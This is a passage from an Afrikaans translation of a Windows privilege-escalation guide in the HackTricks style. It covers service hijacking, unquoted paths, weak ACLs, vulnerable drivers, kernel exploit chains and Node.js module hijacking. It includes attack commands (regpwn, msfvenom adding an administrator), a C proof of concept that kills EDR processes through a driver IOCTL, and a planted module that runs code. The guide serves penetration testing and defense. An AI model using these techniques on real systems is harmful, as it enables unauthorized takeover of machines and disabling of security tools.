beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-toestemmings op dienste se registersleutels

As jy hierdie toestemming op ’n registersleutel het, beteken dit dat **jy subregisters daaronder kan skep**. Vir Windows-dienste is dit **genoeg om arbitrêre kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Ongekwoteerde dienspaadjies

As die pad na ’n uitvoerbare lêer nie tussen aanhalingstekens staan nie, sal Windows probeer om elke einde voor ’n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Lys alle dienspaadjies sonder aanhalingstekens, behalwe dié wat aan ingeboude Windows-dienste behoort:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n diensbinêre lêer met metasploit skep:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word as ’n diens faal. Hierdie funksie kan ingestel word om na ’n binêre lêer te wys. As hierdie binêre lêer vervangbaar is, kan privilege-escalasie moontlik wees. Meer besonderhede is beskikbaar in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Teikens van geskeduleerde taakskripte

Vir ’n geaktiveerde taak wat `cmd.exe /c` met ’n `.bat`- of `.cmd`-lêer uitvoer, gaan die skrip na wat in die **aksie-argumente** genoem word, asook `cmd.exe`. Dieselfde geld vir ’n eksplisiete lêerargument van ’n interpreter, soos PowerShell `-File`. As ’n geskeduleerde bondellêer ’n letterlike PowerShell `-File`-aanroep bevat, ondersoek ook die ACL van die skrip waarna dit verwys; veranderlikes, voorwaardes en dop-opdragte wat aan mekaar geskakel is, moet met die hand nagespoor word. ’n Skrip of ouergids waarop die oproeper kan skryf, is slegs ’n leidraad vir uitvoering tussen rekeninge wanneer die ingestelde taak-prinsipaal van die oproeper verskil én die taak daardie aksie werklik bereik. ’n Slegs-byvoeg-ACL kan vir skripte van belang wees, maar ’n voorafgaande `exit` of ander beheervloei kan veroorsaak dat bygevoegde reëls nooit bereik word nie. Bevestig effektiewe ACL’s, [taakuitvoeringskonteks](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), werkgids, sneller en toepassingsbeheerbeleid voordat jy beweer dat eskalasie moontlik is. Inventarisering moet nie die skrip wysig of die taak begin nie.

## Benoemde strome op toeganklike lêers

Op NTFS kan ’n leesbare lêer ’n benoemde `:$DATA`-stroom hê waarvan die inhoud nie in ’n gewone gidslys vertoon word nie. Vir ’n klein, relevante stel toeganklike rugsteun- of konfigurasielêers, hersien die stroom**name en groottes** voordat jy enige inhoud oopmaak; Windows stel hulle beskikbaar deur [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), en PowerShell se [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). ’n Stroomnaam wat op ’n geheim dui, is slegs ’n leidraad. Gaan die lêer se effektiewe leestoegang, die lêerstelsel se ondersteuning vir strome, of die stroom bruikbare aanmeldbesonderhede bevat, en by watter rekening dit werklik aanmeld, na. Vermy rekursiewe stroomskanderings en die vertoon van stroominhoud tydens roetine-opsomming.

## Hulpinsette vir die geskeduleerde Windows Driver Kit

Die opsionele Windows Driver Kit sluit `StandaloneRunner.exe` in, wat `command.txt`, `reboot.rsf` en ’n projeklêer `working\rsf.rsf` uit sy loopgids kan gebruik. ’n Geskeduleerde taak of diens wat hierdie helper met ’n bevoorregte rekening begin, kan laevoorregte-skryftoegang tot daardie insette in opdraguitvoering binne daardie rekening se konteks omskep, selfs wanneer die helper-uitvoerbare lêer self beskerm word. Bevestig dat daar ’n bevoorregte verbruiker is en dat **albei** bykomstige lêers geskep of gewysig kan word; om net die helper te vind, is nie genoeg nie.

Vir ’n geskeduleerde taak, ondersoek die taak se [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) en die ACL’s van die twee bykomstige lêerpaaie. As die taak nie ’n werkgids spesifiseer nie, is die uitvoerbare lêer se gids slegs ’n leidraad wat bevestig moet word, nie ’n bewys van waar die taak sy insette lees nie. Daar moet ook aan die voorvereiste vir die projek se werklêer voldoen word. Gaan die werklike taak-prinsipaal na eerder as om aan te neem dat dit as SYSTEM loop.

## Toepassings

### Geïnstalleerde toepassings

Gaan die **toestemmings van die binêre lêers** na (dalk kan jy een oorskryf en voorregte eskaleer) en dié van die **gidse** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows-agent-herstelpad

[CVE-2024-0670](https://checkmk.com/werk/16361) raak ouer Checkmk Windows-agents wat opdraglêers in `C:\Windows\Temp` geskryf het en dan 'n bestaande skryfbeskermde lêer uitgevoer het wanneer vervanging misluk het. Die verskaffer het die probleem in 2.1.0p40, 2.2.0p23, 2.3.0b1 en 2.4.0b1 reggestel. Gaan die volledige geïnstalleerde pleistervlak na, asook of die betrokke agentbewerking kan loop; 'n vertakkingsetiket soos `2.1` alleen kan nie blootstelling bevestig nie. Enumerasie kan die weergawe, dienstoestand en Temp-toestemmings nagaan sonder om lêers te skep of agentopdragte te aktiveer.

#### Hersiening van ADSelfService Plus SAML-diens

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) het ADSelfService Plus-bou 6210 en vroeër geraak; die verskaffer het dit in bou 6211 reggestel. Dit is slegs relevant as SAML SSO **geaktiveer is of was**. 'n Geïnstalleerde produkinskrywing of dienspad is dus 'n leidraad, nie 'n kwesbaarheidsbevinding nie: bevestig die presiese bou, die SAML-konfigurasiegeskiedenis, netwerkbereikbaarheid van die diens en die rekening waaronder dit loop. Kode-uitvoering deur die diens erf daardie rekening se regte; uitvoering as SYSTEM vereis 'n instansie wat as SYSTEM loop. 'n Leesbare `OfflineBackup_*.ezip` in die produk se Backup-gids is 'n afsonderlike leidraad oor 'n geënkripteerde rugsteun, nie bewys van 'n bruikbare geloofsbrief of hierdie SAML-fout nie. Teken die pad en toegangregte aan sonder om dit tydens roetine-enumerasie uit te pak.

#### Jenkins-beheerder- en domeinrekeninggrense

Op 'n Windows Jenkins-beheerder, onderskei tussen toestemming om 'n taak te skep of op te stel en toestemming om dit te begin: [Jenkins dokumenteer dit as afsonderlike `Job/Create`-, `Job/Configure`- en `Job/Build`-regte](https://www.jenkins.io/doc/book/security/access-control/permissions/). 'n Opgestelde skedule of afstandsneller kan 'n ander bouroete bied, maar bevestig dat dit geaktiveer is en die bou werklik loop. Uitvoering gebruik die identiteit van die beheerder of die gekose agent, en 'n gestoorde geloofsbrief is slegs bruikbaar as die taak toegang tot die omvang daarvan het. Ondersoek afsonderlik toegang tot `JENKINS_HOME`-metadata: Jenkins hou geloofsbriefmateriaal en enkripsiesleutels in `credentials.xml`, `secrets/hudson.util.Secret` en `secrets/master.key` ([Jenkins-geheimberging](https://www.jenkins.io/doc/developer/security/secrets/)). Die blote teenwoordigheid daarvan openbaar nie 'n wagwoord nie; verifieer **leestoegang tot die vereiste lêers** en 'n afsonderlike pad vir rekeninghergebruik sonder om geheime in gedeelde uitvoer te druk. As daardie rekening skryftoegang tot 'n AD-gebruikerobjek se `scriptPath` het, bevestig 'n skryfbare scriptpad en 'n werklike aanmelding of geskeduleerde verbruiker wat as die teikengebruiker loop voordat jy dit as uitvoering tussen gebruikers beskou. Verdere groepbeheer vereis dat effektiewe AD-regte afsonderlik bevestig word.

#### Azure Pipelines-selfgehoste agentidentiteit

Vir 'n Azure DevOps Server- of Azure Pipelines-projek, onderskei tussen toestemming om 'n pyplyn te **skep of te wysig**, toestemming om dit te **ry**, en toestemming om die gekose agentpoel te gebruik; [Microsoft dokumenteer pyplyntoestemmings](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) en [poelgoedkeuring](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) afsonderlik. As 'n rekening met minder regte 'n skripstap kan indien en daardie pyplyn op 'n selfgehoste Windows-agent kan laat loop, word die stap uitgevoer as die [agent se ingestelde bedryfstelselrekening](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Verifieer die presiese pyplyn, vertakkings-/hulpbronbeperkings, goedgekeurde poel, uitvoerbare taak en agentdiensidentiteit voordat jy 'n oorgang tussen gebruikers of na SYSTEM beweer. 'n Geïnstalleerde agent, projekrol of skryftoegang tot 'n bewaarplek is slegs 'n leidraad; hersien toestemmings en plaaslike diensmetadata sonder om 'n bou tydens passiewe enumerasie te begin.

#### Microsoft Entra Connect Sync-geloofsbriewe

[Microsoft onderskei](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) tussen die **ADSync-diensrekening**, wat die sinchronisasiediens laat loop en toegang tot sy SQL-databasis het, en die **AD DS-verbinderrekening**, waarvan die gidstoestemmings afhang van die ingestelde sinkroniseringskenmerke. Verbindergeloofsbriewe word geënkripteer in daardie databasis gestoor, met sleutelmateriaal wat [deur DPAPI onder die ADSync-diensrekening beskerm word](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). 'n Geïnstalleerde sinkroniseringsdiens, 'n groep met 'n naam wat na plaaslike administrateurregte klink, of blote sigbaarheid van die databasis bewys nie dat 'n geloofsbrief ontsluit kan word of dat daar domeinverhoging is nie. Ondersoek die werklike databasistoegangsregte, diensrekening-/sleuteltoegang, installasie- en SQL-uitleg, ingestelde verbinderidentiteit en daardie identiteit se effektiewe AD-regte afsonderlik. Roetine-enumerasie moet slegs diens- en toegangmetadata wys, nie die gestoorde geheime navraag of vertoon nie.

#### Toestemmings vir drukkerbestuurderondersteunings-DLL's

'n Geïnstalleerde drukkerbestuurder kan ondersteunings-DLL's onder `C:\ProgramData` hou en dit in 'n meer bevoorregte drukproses laai. Hersien die presiese bestuurdergids en DLL-ACL's, insluitend ouergidse en herontledingspunte, selfs as WMI-enumerasie van drukkers geweier word. Vir die [Ricoh-drukkerbestuurderkwessie CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) was die gerapporteerde pad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die oorspronklike bekendmaking](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beskryf DLL-laai deur `PrintIsolationHost.exe`. 'n Skryfbare ACL is slegs 'n leidraad: verifieer effektiewe skryftoegang nadat weieringsinskrywings toegepas is, dat die betrokke bestuurder geïnstalleer is en die lêer onder 'n bevoorregte identiteit laai, en of die verskaffer se opgedateerde bestuurder of sekuriteitsprogram die installasie reggestel het. Moenie kwesbaarheid aflei bloot uit die gidsnaam of bestuurderweergawe nie.

### Skryftoestemmings

Kyk of jy 'n konfigurasielêer kan wysig om 'n spesiale lêer te lees, of 'n binêre lêer kan wysig wat deur 'n Administrateur-rekening uitgevoer gaan word (schedtasks).

'n Manier om swak vouer-/lêertoestemmings in die stelsel op te spoor, is om die volgende te doen:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin-autoload-persistentheid/-uitvoering

Notepad++ laai enige plugin-DLL in sy `plugins`-subvouers outomaties. As ’n skryfbare draagbare/kopie-installasie beskikbaar is, lei die plaas van ’n kwaadwillige plugin tot outomatiese kode-uitvoering binne `notepad++.exe` met elke bekendstelling (insluitend vanuit `DllMain` en plugin-terugroepe).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Lopend by opstart

**Kyk of jy ’n registerinskrywing of binêre lêer kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns-liggings om voorregte te eskaleer**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drywers

Soek na moontlike **vreemde/kwesbare derdeparty-**drywers

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

As ’n driver ’n arbitrêre kernel-lees-/skryfprimitief blootstel (algemeen in swak ontwerpte IOCTL-handelaars), kan jy jou regte eskaleer deur ’n SYSTEM-token direk uit kernelgeheue te steel.<sup>[[13]](#references)</sup> Sien die stap-vir-stap-tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Verwante Windows-kernel-exploitation-materiaal:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Vir race-condition-foute waar die kwesbare oproep ’n aanvaller-beheerde Object Manager-pad oopmaak, kan jy die opsoek doelbewus vertraag (deur komponente met maksimum lengte of diep gidskettings te gebruik) om die venster van mikrosekondes tot tientalle mikrosekondes te verleng:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF's in cancel-safe queues, paged-pool-ont­hullings en I/O ring-pivots

Sommige Windows-kernel-LPE-kettings kan uit twee afsonderlik swak foute gebou word: ’n **cancel-safe queue-leeftyd-race** wat ’n versoek/CBD vrystel terwyl die queue-slot steeds gehou word, en ’n **lock-release-before-copy**-onthulling wat ’n vrygestelde paged-pool-toekenning tydens `RtlCopyToUser` uitlek.<sup>[[29]](#references)</sup>

Oudit- en exploitation-aantekeninge:

- **Free-under-lock + cancel afterwards**: soek na ’n suksespad wat **Acquire -> CompleteRequest/free -> Release** uitvoer terwyl die kanselleringspad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** uitvoer. As die suksespad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` bereik voordat die CBDQ/CSQ-slot vrygestel word, kan ’n thread wat in `NtCancelIoFileEx -> IopCsqCancelRoutine` geblokkeer is later hervat en ’n vrygestelde `PFLT_CALLBACK_DATA` aan die driver se remove-callback deurgee.
- **Herwin die vrygestelde queue-objek** met ’n paged-pool-toekenning van dieselfde grootte wat deur die aanvaller beheer word. `NPFS` Data Queue Entries is nuttig omdat die payload en grootte beheerbaar is, en jy dit later met pipe read/peek-bewerkings kan ondersoek. As die vrygestelde objek list-skakels bevat, oorskryf hulle met ’n **sikliese lys van vals request-nodes in gebruikersgeheue** sodat die driver herhaaldelik aanvaller-gedefinieerde request-strukture verwerk in plaas daarvan om by die oorspronklike list-kop te eindig.
- **Gradeer ’n voorspelbare skryfbewerking op**: as die vals request ’n geneste context-pointer herlei wat deur boekhou-skryfbewerkings gebruik word (tydstempels / QPC / velde aangrensend aan refcount), kan jy ’n kernel-skryfbewerking kry waarvan die **adres beheerbaar is, maar nie die waarde nie**. Teiken in daardie geval die **length/size**-veld van ’n gespuite pool-objek in plaas van ’n finale code-/data-pointer, en deurloop dan die spray totdat die korrupte objek ’n **buite-perke paged-pool-leesbewerking** moontlik maak.
- **Raceable disclosure-patroon**: enige syscall wat `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` uitvoer, is ’n goeie kandidaat. Betroubaarheid verbeter wanneer die aanvaller die gekopieerde buffer kan vergroot (byvoorbeeld deur baie lys-/resource-inskrywings by te voeg wat ’n serializer se finale toekenningsgrootte verhoog), omdat die langer kopie die vervangingsvenster vergroot sonder om noodwendig die masjien te laat crash.
- **Teikens met baie pointers vir hergebruik**: Windows se **I/O ring**-registered-buffer-skikkings is uitstekende disclosure-teikens omdat hul paged-pool-grootte deur die aanvaller beheer word (`8 * regBufferCnt`) en elke element ’n kernel-pointer na ’n `_IOP_MC_BUFFER_ENTRY` is. Lek een van hierdie skikkings uit, herwin die omliggende `IORING_OBJECT`, en korrupteer dan **`RegBuffers`** en **`RegBuffersCount`** sodat daaropvolgende I/O ring-bewerkings aanvaller-vervalste inskrywings gebruik en arbitrêre kernel-lees-/skryftoegang bied. As die enigste beskikbare skryfbewerking ’n stabiele byte oplewer (byvoorbeeld uit `KUSER_SHARED_DATA+0x14`), gebruik **oorvleuelende, ongealigneerde skryfbewerkings** om ’n herhaalde-byte gebruikerspointer soos `0x0101010101010101` te bou, karteer dit met `VirtualAlloc`, en plaas die vervalste registered-buffer-skikking daar.<sup>[[30]](#references)</sup>

Nuttige debugging-aanwysers:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sodra jy arbitrêre kernel-lees-/skryf-toegang vanaf die beskadigde I/O-ring verkry, steel ’n SYSTEM-token met die standaard post-primitive-werkvloei:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitiewe vir geheuekorrupsie in Registry-hives

Moderne kwesbaarhede in hives laat jou toe om deterministiese uitlegte te groom, misbruik te maak van skryfbare HKLM/HKU-afstammelinge en metadatakorrupsie in kernel-paged-pool-overvloeie om te skakel sonder ’n pasgemaakte drywer. Lees hier die volledige ketting:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-tipeverwarring in direkte modus vanaf aanvallerbeheerde paaie

Sommige drywers aanvaar ’n Registry-pad vanaf userland, bevestig net dat dit ’n geldige UTF-16-string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` aan, met ’n skalaar op die stack soos `int readValue` as bestemming. As `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` volgens die **werklike** Registry-tipe geïnterpreteer, nie volgens die tipe wat die ontwikkelaar verwag het nie.

Dit skep twee nuttige primitiewe:<sup>[[24]](#references)[[25]](#references)</sup>

- **Verwarde gevolmagtigde / orakel**: ’n gebruikerbeheerde absolute `\Registry\...`-pad laat die drywer toe om aanvallergekose sleutels te bevraagteken, die bestaan daarvan deur terugkeerkodes/logboeke te verklap, en soms waardes te lees waartoe die oproeper nie direk toegang sou hê nie.
- **Kernel-geheuekorrupsie**: ’n skalaarbestemming soos `&readValue` word deur tipeverwarring as ’n `REG_QWORD`, `UNICODE_STRING` of buffer met ’n bepaalde grootte behandel, afhangend van die Registry-waardetipe.

Praktiese uitbuitingsnotas:

- **Windows 8+-versagting**: as die navraag ’n **onbetroubare hive** tref met `RTL_QUERY_REGISTRY_DIRECT` maar sonder `RTL_QUERY_REGISTRY_TYPECHECK`, val kernel-oproepers vas met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om die uitbuitbaarheid te behou, soek **aanvaller-skryfbare sleutels binne vertroude stelselhives** in plaas daarvan om waardes onder `HKCU` te plaas.
- **Tydelike waardes in ’n vertroude hive**: gebruik NtObjectManager om skryfbare afstammelinge van `\Registry\Machine` op te som, en voer die skandering weer uit met ’n gedupliseerde **lae-integriteit**-token om sleutels te vind wat vanuit sandbox-kontekste bereikbaar is:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: ’n direkte skryf van 8 grepe na ’n 4-greep `int` korrupteer aangrensende stapeldata en kan ’n nabygeleë terugbel-/funksiewyser gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direkte modus verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die kode eers ’n aanvallerbeheerde `REG_DWORD` in ’n stapelskalaar laai en dan dieselfde buffer vir ’n stringlees hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed dit die `Buffer`-wyser gedeeltelik, wat ’n gedeeltelik beheerde kernskryf tot gevolg het.
- **`REG_BINARY`**: vir groot binêre data behandel direkte modus die eerste `LONG` by `EntryContext` as ’n getekende buffergrootte. As ’n vorige `REG_DWORD`-lees ’n **negatiewe**, aanvallerbeheerde waarde in die hergebruikte skalaar laat, kopieer die volgende `REG_BINARY`-navraag aanvallergrepe direk oor aangrensende stapelgleuwe. Dit is dikwels die skoonste manier om ’n terugbelwyser volledig te oorskryf.

Sterk jagpatroon: **heterogene registerlesings na dieselfde stapelveranderlike sonder om dit te herinitialiseer**. Soek vir `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext`-wysers en kodepaaie waar die eerste registerlees bepaal of ’n tweede lees plaasvind.

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op toestelobjekte (LPE + EDR-doodmaak)

Sommige ondertekende derdeparty-drywers skep hul toestelobjek met ’n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie vlag word die veilige DACL nie afgedwing wanneer die toestel oopgemaak word via ’n pad met ’n ekstra komponent nie. Dit laat enige onbevoorregte gebruiker toe om ’n handvatsel te verkry deur ’n naamruimtepad soos die volgende te gebruik:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n werklike geval)

Sodra ’n gebruiker die toestel kan oopmaak, kan die drywer se bevoorregte IOCTL’s misbruik word vir LPE en peutery. Voorbeelde van vermoëns wat in die praktyk waargeneem is:
- Lewer handvatsels met volle toegang tot arbitrêre prosesse terug (tokendiefstal / SYSTEM-dop via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte rou skyflees/skryf (vanlyn peutery, truuks vir volharding tydens selflaai).
- Beëindig arbitrêre prosesse, insluitend Protected Process/Light (PP/PPL), wat dit moontlik maak om AV/EDR vanuit gebruikersland via die kern dood te maak.

Minimale PoC-patroon (gebruikersmodus):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Versagtingsmaatreëls vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN in wanneer jy toestelobjekte skep wat deur ’n DACL beperk moet word.
- Valideer die oproeper se konteks vir bevoorregte bewerkings. Voeg PP/PPL-kontroles by voordat prosesbeëindiging of terugstuur van handvatsels toegelaat word.
- Beperk IOCTLs (toegangsmaskers, METHOD_*, invoervalidering) en oorweeg bemiddelde modelle in plaas van direkte kernvoorregte.

Opsporingsidees vir verdedigers
- Monitor gebruikermodus-openings van verdagte toestelname (bv. \\ .\\amsdk*) en spesifieke IOCTL-reekse wat op misbruik dui.
- Dwing Microsoft se kwesbarebestuurder-bloklys af (HVCI/WDAC/Smart App Control) en onderhou jou eie toelaat-/weierlyste.


## PATH DLL Hijacking

As jy **skryftoestemmings het binne ’n vouer wat op PATH voorkom**, kan jy moontlik ’n DLL wat deur ’n proses gelaai word kaap en **voorregte eskaleer**.<sup>[[2]](#references)</sup>

Gaan die toestemmings na van al die vouers in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron-module-resolusie-kaping via `C:\node_modules`

Dit is ’n variant van ’n **Windows-onbeheerde soekpad** wat **Node.js**- en **Electron**-toepassings raak wanneer hulle ’n kaal import soos `require("foo")` uitvoer en die verwagte module **ontbreek**.<sup>[[20]](#references)</sup>

Node soek pakkette deur opwaarts deur die gidsboom te beweeg en die `node_modules`-vouers in elke ouergids na te gaan. Op Windows kan hierdie soektog tot by die skyfwortel strek. ’n Toepassing wat vanaf `C:\Users\Administrator\project\app.js` geloods word, kan dus die volgende paaie ondersoek:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As ’n **gebruiker met lae voorregte** `C:\node_modules` kan skep, kan hulle ’n kwaadwillige `foo.js` (of pakketgids) daar plaas en wag totdat ’n **Node/Electron-proses met hoër voorregte** die ontbrekende afhanklikheid probeer oplos. Die payload word in die sekuriteitskonteks van die slagofferproses uitgevoer. Dit word dus **LPE** wanneer die teiken as ’n administrateur, vanuit ’n geskeduleerde taak/diens-omhulsel met verhoogde voorregte, of vanuit ’n outomaties gestarte bevoorregte lessenaartoepassing loop.

Dit kom veral algemeen voor wanneer:

- ’n afhanklikheid in `optionalDependencies` verklaar word<sup>[[22]](#references)</sup>
- ’n derdeparty-biblioteek `require("foo")` in `try/catch` omvou en voortgaan wanneer dit misluk
- ’n pakket uit produksiebouwe verwyder is, tydens verpakking weggelaat is, of nie geïnstalleer kon word nie
- die kwesbare `require()` diep binne die afhanklikheidsboom voorkom, eerder as in die hooftoepassingskode

### Soek na kwesbare teikens

Gebruik **Procmon** om die resolusiepad te bevestig:<sup>[[23]](#references)</sup>

- Filtreer volgens `Process Name` = die teikenuitvoerbare lêer (`node.exe`, die Electron-toepassing se EXE, of die omhulselproses)
- Filtreer volgens `Path` wat `node_modules` `contains`
- Fokus op `NAME NOT FOUND` en die laaste suksesvolle opening onder `C:\node_modules`

Nuttige kodehersieningspatrone in uitgepakte `.asar`-lêers of toepassingsbronkode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifiseer die **ontbrekende pakketnaam** met Procmon of deur bronhersiening.
2. Skep die root-opsoekgids as dit nog nie bestaan nie:

```powershell
mkdir C:\node_modules
```

3. Plaas ’n module met die presiese verwagte naam:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Laat die slagoffertoepassing loop. As die toepassing `require("foo")` probeer uitvoer en die wettige module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Voorbeelde uit die werklike wêreld van ontbrekende opsionele modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **tegniek** is die herbruikbare deel: vind enige **ontbrekende kaal import** wat ’n bevoorregte Windows Node/Electron-proses sal oplos.

### Idees vir opsporing en verharding

- Stel ’n waarskuwing op wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/-pakkette daar skryf.
- Soek na hoë-integriteitprosesse wat vanaf `C:\node_modules\*` lees.
